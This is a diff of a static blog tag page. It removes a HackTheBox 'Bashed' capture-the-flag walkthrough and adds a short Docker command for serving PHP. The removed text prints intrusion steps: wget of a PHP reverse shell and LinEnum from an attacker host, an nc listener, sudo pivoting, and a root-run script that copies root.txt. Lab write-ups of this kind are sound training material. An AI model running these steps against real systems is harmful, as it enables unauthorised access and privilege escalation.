@@ -6,7 +6,7 @@
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<title>Random stuff - htb tag</title>
+<title>Random stuff - bash tag</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="description" content="">
 <link rel="shortcut icon" href="/" type="">
@@ -59,105 +59,16 @@
 
 
             <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
-                <a href="/bashed.html" class="uk-article-title uk-link-muted" itemprop="name">Bashed</a>
-                <p class="uk-article-meta"><time datetime="2020-01-13" itemprop="datePublished">pon 13 stycznia 2020</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
+                <a href="/php-in-docker-snippet.html" class="uk-article-title uk-link-muted" itemprop="name">Fastest way to run PHP site on Docker</a>
+                <p class="uk-article-meta"><time datetime="2020-08-26" itemprop="datePublished">śro 26 sierpnia 2020</time> • <a href="/category/snippets.html">Snippets</a></p>
 </p>
-                <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
-                <section itemprop="articleBody"><h1>User flag</h1>
-<p>It is not really necessary to start this one with <strong>nmap</strong>, but it's never a bad first step</p>
-<div class="highlight"><pre><span></span>root@kali:~# nmap -sS -Pn -sV <span class="m">10</span>.10.10.68
+                <p class="uk-article-lead" itemprop="description">Just a tiny snippet for future use</p>
+                <section itemprop="articleBody"><div class="highlight"><pre><span></span>docker run -p <span class="m">80</span>:80  -v <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:/var/www/html php:7.2-apache
 </pre></div>
 
 
-<div class="highlight"><pre><span></span>Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
-Nmap scan report for 10.10.10.68
-Host is up (0.11s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
-</pre></div>
-
-
-<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <strong>phpbash</strong> project. That's nice, but we want to speed things up.</p>
-<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
-It takes him a few minutes to find the thing we need:</p>
-<div class="highlight"><pre><span></span>http://10.10.10.68/dev/phpbash.php
-</pre></div>
-
-
-<p>After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?</p>
-<div class="highlight"><pre><span></span>$ ls /user
-$ cat /home/arrexel/user.txt
-</pre></div>
-
-
-<p>Yup, we got it!</p>
-<h1>Root flag</h1>
-<p><em>phpbash</em> is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.</p>
-<p>Firstly we need a place in the /var/www/html path to store it. Only the <strong>upload</strong> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
-<div class="highlight"><pre><span></span>www-data:/var/www/html/uploads# wget <span class="m">10</span>.10.14.16/shell.php
-</pre></div>
-
-
-<p>Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.</p>
-<div class="highlight"><pre><span></span>root@kali:/var/www/html# nc -v -n -l -p <span class="m">1234</span>
-</pre></div>
-
-
-<p>It works, so now the same thing in <em>/tmp</em> dir <em>LinEnum</em></p>
-<div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
-wget <span class="m">10</span>.10.14.16/LinEnum.sh
-bash ./LinEnum.sh
-</pre></div>
-
-
-<p>We can see good stuff in it's output!</p>
-<div class="highlight"><pre><span></span>[+] We can sudo without supplying a password!
-Matching Defaults entries for www-data on bashed:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
-</pre></div>
-
-
-<p>We knew about this user already from listing the home directory. Now we can sudo it.</p>
-<div class="highlight"><pre><span></span>$ sudo -u scriptmanager bash
-</pre></div>
-
-
-<p>Works. What next? We need something to find a point for privilege escalation. <strong>pspy</strong> will help us with it.</p>
-<div class="highlight"><pre><span></span>./pspy64
-</pre></div>
-
-
-<div class="highlight"><pre><span></span><span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2297</span>   <span class="o">|</span> <span class="nt">python</span> <span class="nt">test</span><span class="p">.</span><span class="nc">py</span>
-<span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2296</span>   <span class="o">|</span> <span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span> <span class="nt">-c</span> <span class="nt">cd</span> <span class="o">/</span><span class="nt">scripts</span><span class="o">;</span> <span class="nt">for</span> <span class="nt">f</span> <span class="nt">in</span> <span class="o">*</span><span class="p">.</span><span class="nc">py</span><span class="o">;</span> <span class="nt">do</span> <span class="nt">python</span> <span class="s2">&quot;$f&quot;</span><span class="o">;</span> <span class="nt">done</span>
-</pre></div>
-
-
-<p>Nice, we can see, that <strong>/scrips</strong> dir is owned by <strong>scriptmanager</strong>!</p>
-<p>Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">shutil</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s2">&quot;/root/root.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/root.txt&quot;</span><span class="p">)</span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chmod 777 /tmp/root.txt&quot;</span><span class="p">)</span>
-</pre></div>
-
-
-<p>As in every step, I've served it on my Kali apache, so:</p>
-<div class="highlight"><pre><span></span>$ wget <span class="m">10</span>.10.14.16/bashed/run.py
-
-sudo -u scriptmanager cp run.py /scripts
-$ cat /tmp/root.txt
-</pre></div>
-
-
-<p>IT'S ROOTED. It was not difficult but fun!</p></section>
-                <a href="/bashed.html#disqus_thread"></a>
+<p>Yup, thats all. I just wanted to have this for fast future use</p></section>
+                <a href="/php-in-docker-snippet.html#disqus_thread"></a>
                 <hr class="uk-article-divider">
             </article>
 
